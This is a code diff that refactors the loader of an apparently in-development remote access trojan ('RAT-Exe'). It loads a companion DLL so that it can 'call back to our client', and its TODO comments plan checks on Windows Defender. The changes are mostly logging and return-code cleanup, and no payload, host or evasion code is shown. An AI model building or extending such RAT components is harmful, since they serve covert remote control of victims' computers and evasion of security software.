@@ -2,31 +2,32 @@
 // Version 1.0
 // RAT-Exe.cpp : This file contains the 'main' function. Program execution begins and ends there.
 
-#include <windows.h>
-#include <iostream>
+#include "RAT-Exe-Main.h"
 
 
 int main()
 {
-    printf("Initializing program... \n");
+    OutputDebugStringA("RAT-Exe-Main::main - Initializing program...\n");
 
     // First we survey the system, paying particualr attention to Windows Defender specifics 
     // TODO: Windows Defender call
 
     // If we are in a 'operational' space load our DLL into memory so it can call back to our client 
     // TODO: Dll load call for Internals-DLL
-    LPCWSTR dllName = L"Internals-DLL.dll";
+    DWORD lastError;
+    LPCWSTR dllName = DLL_NAME;
     HMODULE hGetProcIDLL = LoadLibrary(dllName);
 
     if (!hGetProcIDLL)
     {
-        printf("Could not successfully load target DLL \n");
-        DWORD lastError = GetLastError();
-        printf("Last error: %08x) \n", lastError);
-        return -1;
+        OutputDebugStringA("RAT-Exe-Main.cpp::main - Could not successfully load target DLL\n");
+        lastError = GetLastError();
+        sprintf_s(msgBuf, "RAT-Exe-Main::main - Last error: %08x) \n", lastError);
+        OutputDebugStringA(msgBuf);
+        return FAILURE;
     }
 
-    printf("Successfully loaded target DLL \n");
+    OutputDebugStringA("RAT-Exe.cpp-Main::main - Successfully loaded target DLL\n");
 
     // Grab proc address to call into 
     typedef UINT (WINAPI* DLLFUNCPOINT) (HMODULE,DWORD,LPVOID);
@@ -35,8 +36,9 @@ int main()
 
     if (!DllFuncPoint)
     {
+        printf("Failed to get function pointer in DLL!\n");
         FreeLibrary(hGetProcIDLL);
-        return false;
+        return FAILURE;
     }
     else
     {
